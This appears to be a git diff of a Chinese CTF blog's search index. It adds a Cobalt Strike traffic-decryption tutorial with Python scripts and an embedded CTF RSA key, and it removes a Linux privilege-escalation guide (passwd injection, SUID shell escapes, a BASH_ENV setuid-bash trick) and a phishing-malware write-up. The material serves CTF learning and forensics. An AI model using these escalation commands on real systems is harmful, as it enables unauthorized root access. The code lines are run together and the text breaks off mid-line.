+import hmacimport base64import hashlibimport hexdumpimport binasciiimport javaobj.v2 as javaobjfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5file_path = &quot;.cobaltstrike.beacon_keys&quot;#.cobaltstrike.beacon_keys文件路径encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据内容encrypt_data = &quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;#任务数据内容def format_key(key_data):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN PRIVATE KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END PRIVATE KEY-----&quot;    return formatted_keydef decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)with open(file_path, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]SHARED_KEY = binascii.unhexlify(aes_key.hex())HMAC_KEY = binascii.unhexlify(hmac_key.hex())encrypt_data = base64.b64encode(bytes.fromhex(encrypt_data)).decode()encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))
+
+需要修改的就只有三个：file_path、encode_data、encrypt_data
+同时因为心跳包（submit.php的data）不止一个，需要我们修改脚本里的encrypt_data多次尝试。
+。
+。
+。
+第二种方法：
+这种是一步步来的，分了大概四步
+因为是CTF比赛所以会有.cobaltstrike.beacon_keys 文件，同时该文件本质上为 KeyPair 的 Java 对象，Python 的 javaobj-py3 库可以直接读取里面存储的数据。
+首先，我们需要先获取 .cobaltstrike.beacon_keys 文件中的私钥。这个私钥是 RSA 私钥，用于解密元数据。
+脚本：
+import base64import javaobj.v2 as javaobjwith open(&quot;.cobaltstrike.beacon_keys&quot;, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)def format_key(key_data, key_type):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN &#123;key_type&#125; KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END &#123;key_type&#125; KEY-----&quot;    return formatted_keyprivateKey = format_key(pobj.array.value.privateKey.encoded.data, &quot;PRIVATE&quot;)publicKey = format_key(pobj.array.value.publicKey.encoded.data, &quot;PUBLIC&quot;)print(privateKey)print(publicKey)
+
+然后我们在通过私钥解密元数据、获取 AES KEY，其中 encode_data 为元数据，也就是之前看到的 cookie 的值。
+那什么是AESkey呢？
+因为Cobalt Strike 的 Beacon 通信主要依赖于 AES key 和 HMAC key 。这两个密钥都是由 Beacon 在每次执行时随机生成的 16字节数据。
+AES key：这个密钥用于加密和解密 Beacon 与 C2 服务器之间的通信内容。具体来说，它用于 AES 算法，该算法用于加密和解密Beacon任务的传输。
+HMAC key ：这个密钥用于验证数据的完整性和真实性。HMAC （Hash-based Message Authentication Code）是一种基于密钥的哈希算法，用于在不安全的通信环境中验证消息的完整性和真实性。
+这两个密钥都是由同一组16字节数据生成的。具体来说，这组16字节数据的 SHA256 哈希的前半部分作为 HMAC 密钥，后半部分作为 AES 密钥。
+脚本：
+import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdumpPRIVATE_KEY = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----&#123;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1rTo4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5GqhPz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAECgYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5Vr7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFWvHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNpv+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3CdsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJBAIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2ddsyNI6XbCU=&#125;-----END PRIVATE KEY-----&quot;&quot;&quot;#rsa私钥encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]    print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))    print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))    hexdump.hexdump(ciphertext)
+
+到此我们就得到了 AES key 和 HMAC key
+接着要去解密 submit.php 所传递的 Data ，首先我们要先对该串16进制数据进行处理，转字符串后进行 Base64 编码
+import base64encode_data = &#x27;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#x27;#任务数据bytes_data = bytes.fromhex(encode_data)encrypt_data = base64.b64encode(bytes_data)print(encrypt_data.decode())
+
+最终分别填入 SHARED_KEY，HMAC_KEY，encrypt_data 即可
+import hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AESSHARED_KEY = binascii.unhexlify(&quot;ef08974c0b06bd5127e04ceffe12597b&quot;)#AES keyHMAC_KEY = binascii.unhexlify(&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;)#HMAC keyencrypt_data = &quot;AAAAwJPf9rLwWLpCMeOQAnZWZEHyu0x25chICHSk2Z3wgwVKXqHdSupVI8dRr30SPujp8iU6XM3PVEJ9FHxVaxVlfuJgfpKzVzLyY0G8CibFi/K88jg61kBkHDZBWThyIzYMwW/z3BSrHwDm7k+1P14Vt2e9N5RR0Ne29K6unbDD8w8+8We32z5qwkFkPtJRPnP56RSOvnr6oSLqdelFyKuKgWF55DGAJXvYvnUoJ90N4mgm1WEe4JOR7lVFiX2uHTqWmA==&quot;#任务数据（解密过的）def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))
+
+就OK了
+例题： 2023 SICTF 一起上号不         解析： Misc Record | MetaVi （在#杂题那）
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Network</tag>
+      </tags>
   </entry>
   <entry>
     <title>Misc Ultra</title>
@@ -1404,308 +1795,8 @@ Linux提权详细见我这篇博客 Linux提权浅析 | MetaVi
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux提权浅析</title>
-    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
-    <content><![CDATA[passwd提权/etc/passwd和 /etc/shadow文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 passwd或 shadow文件的内容或权限配置有误，则可以被利用来进行系统提权。
-我们先了解一下 /etc/passwd内容的含义：
-Linux 密码信息保存在两个文件中，分别为：/etc/passwd和 /etc/shadow
-/etc/passwd文件用于保存用户信息，每一行代表一个用户，每一行通过冒号 :分为七个部分:
-
-用户名
-密码，若为 x则表示密码保存在/etc/shadow
-UID，0 代表 root
-GID，表示所在组
-描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other
-用户主目录
-默认 shell 类型
-
-例如，假设 /etc/passwd文件中其中一行信息如下：
-
-其含义解读如下：
-​	*用户名：test-user
-​	*密码保存在 /etc/shadow中
-​	*UID 为 1001
-​	*GID 为 1001
-​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]
-​	*用户主目录为 /home/test-user
-​	*默认 shell 为 /bin/bash
-因此在登陆时候的权限是通过第三个字段 UID和第四个字段 GID确定。其中 UID=0代表 root 用户
-如果我们能够对 /etc/passwd文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。
-所以，获取passwd的写入权限十分重要
-通常来说，通过 /etc/passwd提权的方法有两种：
-
-如果具有 /etc/passwd的 w (写入) 权限，可以直接添加一个 root 权限的用户
-如果 /etc/passwd中存储 root 用户密码哈希，可以使用 john 进行破解
-
-场景一：&#x2F;etc&#x2F;passwd 具有写权限查看
-ls -alh /etc/passwd /etc/shadow
-
-如果有 --wx--xrwx 意味着我们具有写入权限，接下来我们需要做的就是
-自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 UID设置为 0，此时我们登陆就可以获取 root 权限。
-查看 passwd 文件中 root 用户数据的格式
-cat /etc/passwd|grep root
-
-结果
-root:x:0:0:root:/root:/bin/bash
-
-先设置用户名，如syl-passwd
-syl-passwd:x:0:0:root:/root:/bin/bash
-
-设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 openssl套件
-使用 openssl创建一个密码为 pass123 的 linux hash，命令如下：
-openssl passwd -1 -salt ignite pass123#-1 ：使用 MD5 hash 算法#-salt ：对 hash 算法加 &quot;盐&quot;
-
-计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：
-syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
-
-添加到passwd
-echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd#必须使用单引号，不能使用双引号#使用 &gt;&gt;，而不是 &gt;
-
-这样即添加成功，也可以再次查看一下
-cat /etc/passwd|grep syl-passwd
-
-接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限
-场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash一样查看读写权限
-ls -alh /etc/passwd /etc/shadow
-
-但是发现权限配置都是正确的，普通用户只具有 /etc/passwd文件的读权限。
-接下来查看 /etc/passwd文件的内容：
-cat /etc/passwd
-
-结果发现
-root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash
-
-中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了
-先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：
-echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt# 此处必须单引号
-
-然后就john：
-john ~/hash.txt
-
-最后得到密码是hello
-接下来就一样了，su root，提权。
-shadow提权shadow提权与passwd类似
-都是获取root密码的哈希值然后进行爆破
-SUID提权什么是suid提权？
-SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。
-suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
-linux引入了3个文件来管理用户组：
-
-&#x2F;etc&#x2F;passwd存放用户信息。
-&#x2F;etc&#x2F;shadow存放用户密码信息。
-&#x2F;etc&#x2F;group存放组信息
-
-利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。
-如何设置suid列出所有文件：
-ls -al
-
-设置suid：
-chmod u+s filename #设置suidchmod u-s filename #去除suid
-
-如果文件从-rw变成了-rwS说明添加上了suid权限
-注意：
-
-只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义
-命令执行者要对该程序文件拥有执行(x)权限才能使用
-SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效
-
-具有suid权限的二进制可执行文件有：
-nmapvimfindbashmorelessnanocpawk
-
-
-
-如何查找查找系统上运行的suid文件，且查找具有root权限的
-find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;# /表示从文件系统的顶部（根）开始并找到每个目录# -perm 表示搜索随后的权限# -u = s表示查找root用户拥有的文件# -type表示我们正在寻找的文件类型# f 表示常规文件，而不是目录或特殊文件# 2表示该进程的第二个文件描述符，即stderr（标准错误）# &gt;表示重定向# /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。
-
-查找如下：
-
-
-ls一下看看是否设置了suid权限
-ls -al /usr/bin/su#查看/usr/bin/su有无suid权限
-
-如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。
-进行提权这里的前提都是要有suid权限
-如果之前查找到的usr/bin/find具有root权限，就用find命令进行提权
-findfind filename -exec whoami \; -quit# rootfind filename -exec /bin/sh -p \; -quit# whoami# root# 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su
-
-还有一种差不多的提权方法
-#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限touch 1.txt #创建1.txt/usr/bin/find 1.txt -exec whoami \;
-
-好像也可以：
-find /etc/passwd -exec /bin/bash -p \;
-
-如果最后出了个root就说明提权成功了
-同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：
-
-
-
-suid文件
-提权命令
-
-
-
-&#x2F;usr&#x2F;bin&#x2F;bash
-bash -p
-
-
-&#x2F;usr&#x2F;bin&#x2F;csh
-csh -b
-
-
-&#x2F;usr&#x2F;bin&#x2F;sh
-sh -p
-
-
-&#x2F;usr&#x2F;bin&#x2F;ksh
-ksh -p
-
-
-&#x2F;usr&#x2F;bin&#x2F;zsh
-zsh
-
-
-&#x2F;usr&#x2F;bin&#x2F;find
-find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;
-
-
-&#x2F;usr&#x2F;bin&#x2F;awk
-awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’
-
-
-&#x2F;usr&#x2F;bin&#x2F;man
-!&#x2F;bin&#x2F;bash
-
-
-&#x2F;usr&#x2F;bin&#x2F;more
-!&#x2F;bin&#x2F;bash
-
-
-利用相关命令均可在这个网站上查询：GTFOBins
-namp适用版本：nmap2.02至5.21。
-nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。
-首先是进入nmap交互模式
-nmap --interactive
-
-之后利用命令进行提权
-nmap&gt; !shsh-3.2# whoamiroot
-
-
-
-less&#x2F;more使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用!命令进入shell。
-less与more相似，以less为例
-less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令
-less /etc/passwd
-
-之后进入交互界面，输入
-!/bin/sh
-
-VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profilevless /etc/profilev:shell
-
-就可以进入交互界面然后写入shell的
-nanonano进入shell页面似乎比较简单
-nanoctrl + Rctrl + X#shell
-
-
-
-cp&#x2F;mv以cp为例
-主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权
-whoami#qszd
-
-openssl passwd -1 -salt test testaaa
-
-echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd
-
-cat /etc/passwd
-
-su - test
-
-
-
-vi&#x2F;vimvim为例
-首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是
-vim.tiny /etc/passwd
-
-:!/bin/sh
-
-
-
-BASH_ENV提权
-前提知识: 在Linux中，.bashrc 被用来初始化交互shell，而 BASH_ENV 用来初始化非交互shell; 
-就是说只要是在 BASH_ENV 变量中写入的语句，在每个shell脚本执行前，都会执行一次。
-
-由此可见，使用BASH_ENV提权,只要按照以下3个步骤即可:
-
-得到一个linux管理员使用su命令的账户;
-定义BASH_ENV变量;
-等待linux管理员使用su切换到root，执行某个脚本;
-
-第三步也可以运行那种暂时提高到root的程序脚本
-写入环境变量
-echo &#x27;cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell&#x27; &gt; /tmp/exploit export BASH_ENV=/tmp/exploit  #写入exploit到环境变量中
-
-接下来执行程序就可以拿到shell了
-/tmp/root_shell -p  # 获取 root shell
-
-或者直接在root里面找flag
-export BASH_ENV=/tmp/test.sh  echo &#x27;cat /root/flag &gt; /tmp/root.txt 2&gt;&amp;1&#x27; &gt; /tmp/test.sh  #写入执行程序cat /tmp/root.txt  #读取
-
-
-
-其他提权通过查询历史记录从而获得信息泄露的信息利用以下命令可以获取
-cat ~/.bash_history
-
-这个命令可以查看当前用户使用过的历史命令
-有可能会得到root登录的密码
-]]></content>
-      <tags>
         <tag>CTF</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACMer</title>
-    <url>/2024/11/ACMer/</url>
-    <content><![CDATA[还没想好写啥
-
-https://www.bilibili.com/video/BV1MoZAYyEUk?t=2.0
-]]></content>
-      <tags>
-        <tag>ACM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>18届软件创新攻防赛部分wp</title>
-    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
-    <content><![CDATA[1.钓鱼邮件拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：
-
-
-发现有一个生日礼物.zip，点击下载
-下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111
-
-
-然后发现一个exe，双击运行。
-然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe
-因为会实时变化，记得要截图看会好看一点。
-
-
-放大就能看到这个远程地址 222.218.218.218:55555
-
-
-包上md5得到flag：df3101212c55ea8c417ad799cfc6b509
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
       </tags>
   </entry>
   <entry>
@@ -1733,97 +1824,6 @@ NewStar-re复现学MISC果然还是要带点其他领域，那就学点RE吧！�
       <tags>
         <tag>CTF</tag>
         <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Network Traffic Analysis</title>
-    <url>/2025/02/Network-Traffic-Analysis/</url>
-    <content><![CDATA[写在前面感觉流量分析真的是MISC中的一个大项，开一篇专门的文章好学习流量分析
-CS流量——CobaltStrike流量
-“Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。”
-一些细节知识可以看这个 Cobalt Strike | Defining Cobalt Strike Components &amp; BEACON | Google Cloud Blog
-更多CS流量相关看 前言 | Cobalt Strike
-
-Cobalt Strike 服务端和客户端是通过 SSL 加密通讯的 (默认证书对 cobaltstrike.store )。
-Beacon 的元数据传输过程中虽然使用的是 RSA 算法，但是 Beacon 任务的传输使用的却是 AES 算法加密的，而 AES 密钥则是 Beacon 随机生成的然后通过 RSA 交换 AES密钥。加解密算法为 AES ，密钥位长 128 ，CBC 模式，填充标准 PKCS7 ，其通信具体流程如下。
-
-
-流量传递Cobalt Strike 分为 客户端 与 服务端 ，服务端是一个，客户端可以有多个，可被团队进行分布式协作操作。
-Cobalt Strike 的 Beacon 支持异步通信和交互式通信。Beacon 可以选择通过 DNS 还是 HTTP 协议出口网络，你甚至可以在使用Beacon 通讯过程中切换 HTTP 和 DNS。其支持多主机连接，部署好 Beacon 后提交一个要连回的域名或主机的列表，Beacon 将通过这些主机轮询。
-http-beacon 通信中，默认使用 GET 方法向 /dpixel 、/__utm.gif 、/pixel.gif 等地址发起请求，同时 Cobalt Strike 的Beacon 会将元数据（例如AES密钥）使用 RSA 公钥加密后发送给 C2 服务器。
-这些元数据通常被编码为 Base64 字符串并作为 Cookie 发送。如下图：
-流量特征cs流量的http通讯一般会有以下的特征
-比如搜索http类型数据后查看到有出现post请求/sumbit.php？id=xxx的特征，该特征可以判断 cobalt strike。
-这是因为cs在下发特征时会请求这个/sumbit.php？id=xxx，同时 POST 传递了一串 0000 开头的16进制数据，这是 cs 流量的发送任务数据（可以根据这个辨别cs），任务数据里的内容十分重要，如下：
-
-
-
-
-心跳包特征：
-间隔一定时间，均有通信，且流级上的上下行数据长度固定；
-使用Wireshark等网络抓包工具，可以捕获到后门的HTTP数据包“GET &#x2F;4Ekx HTTP&#x2F;1.1”，其中的 “4Ekx”就是心跳包，通过查看心跳包获取一般cs心跳包会有4个数字或者字母组成。
-https特征：
-https-beacon 通信中，默认使用空证书建立加密通道，流量中可以看见这一过程。
-在数据包的client hello中，数据包有JA3（JA3 是由 John Althouse、Jeff Atkinson 和 Josh Atkins 创建的开源项目。 JA3 &#x2F; JA3S 可以为客户端和服务器之间的通信创建 SSL 指纹。）
-和操作系统有关，每个操作系统都有固定的值。这里列出几个已知的 ja3 &#x2F; ja3s 指纹信息，这个值在不同操作系统上是不一样的
-JA3
-
-72a589da586844d7f0818ce684948eea
-a0e9f5d64349fb13191bc781f81f42e1
-
-JA3s
-
-b742b407517bac9536a77a7b0fee28e9
-ae4edc6faf64d08308082ad26be60767
-
-解密那拿到的cs流量我们怎么解密呢？
-大致是需要三样东西： .cobaltstrike.beacon_keys 文件、cookie元数据、submit.php的data
-第一种方法：
-这种一步到位
-有了这三样东西我们便可以直接执行脚本，项目地址 5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本
-安装库：
-pip install hexdump javaobj-py3
-
-脚本如下：
-import hmacimport base64import hashlibimport hexdumpimport binasciiimport javaobj.v2 as javaobjfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5file_path = &quot;.cobaltstrike.beacon_keys&quot;#.cobaltstrike.beacon_keys文件路径encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据内容encrypt_data = &quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;#任务数据内容def format_key(key_data):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN PRIVATE KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END PRIVATE KEY-----&quot;    return formatted_keydef decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)with open(file_path, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]SHARED_KEY = binascii.unhexlify(aes_key.hex())HMAC_KEY = binascii.unhexlify(hmac_key.hex())encrypt_data = base64.b64encode(bytes.fromhex(encrypt_data)).decode()encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))print(&quot;HMAC key: 